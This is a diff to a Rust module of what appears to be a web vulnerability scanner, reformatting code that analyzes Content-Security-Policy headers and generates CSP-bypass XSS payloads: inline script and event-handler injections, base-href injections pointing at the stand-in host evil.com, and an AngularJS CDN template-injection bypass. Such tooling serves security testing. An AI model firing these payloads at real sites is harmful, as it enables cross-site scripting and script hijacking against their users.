@@ -65,7 +65,11 @@ pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
                         analysis.allows_blob_scheme = true;
                     }
                     // Collect whitelisted domains (not keywords)
-                    if !lower.starts_with('\'') && lower != "data:" && lower != "blob:" && lower != "*" {
+                    if !lower.starts_with('\'')
+                        && lower != "data:"
+                        && lower != "blob:"
+                        && lower != "*"
+                    {
                         analysis.whitelisted_domains.push(v.to_string());
                     }
                 }
@@ -107,10 +111,7 @@ pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
 
     // No script-src or default-src → CSP doesn't restrict scripts at all
     if analysis.missing_script_src {
-        payloads.push(format!(
-            "<script class={}>alert(1)</script>",
-            class_marker
-        ));
+        payloads.push(format!("<script class={}>alert(1)</script>", class_marker));
         payloads.push(format!(
             "<img src=x onerror=alert(1) class={}>",
             class_marker
@@ -120,18 +121,12 @@ pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
 
     // unsafe-inline: direct inline script/event handler execution
     if analysis.has_unsafe_inline {
-        payloads.push(format!(
-            "<script class={}>alert(1)</script>",
-            class_marker
-        ));
+        payloads.push(format!("<script class={}>alert(1)</script>", class_marker));
         payloads.push(format!(
             "<img src=x onerror=alert(1) class={}>",
             class_marker
         ));
-        payloads.push(format!(
-            "<svg onload=alert(1) class={}>",
-            class_marker
-        ));
+        payloads.push(format!("<svg onload=alert(1) class={}>", class_marker));
         payloads.push(format!(
             "<div onmouseover=alert(1) class={}>hover</div>",
             class_marker
@@ -188,10 +183,7 @@ pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
             "<base href=\"https://evil.com/\" class={}>",
             class_marker
         ));
-        payloads.push(format!(
-            "<base href=\"//evil.com/\" id={}>",
-            id_marker
-        ));
+        payloads.push(format!("<base href=\"//evil.com/\" id={}>", id_marker));
     }
 
     // Missing object-src → object/embed injection
@@ -217,7 +209,10 @@ pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
             ));
         }
         // Angular CDN — template injection via Angular bootstrap
-        if d.contains("angularjs.org") || d.contains("angular") || d.contains("cdnjs.cloudflare.com") {
+        if d.contains("angularjs.org")
+            || d.contains("angular")
+            || d.contains("cdnjs.cloudflare.com")
+        {
             payloads.push(format!(
                 "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\" class={}></script><div ng-app ng-csp>{{{{$eval.constructor('alert(1)')()}}}}</div>",
                 class_marker
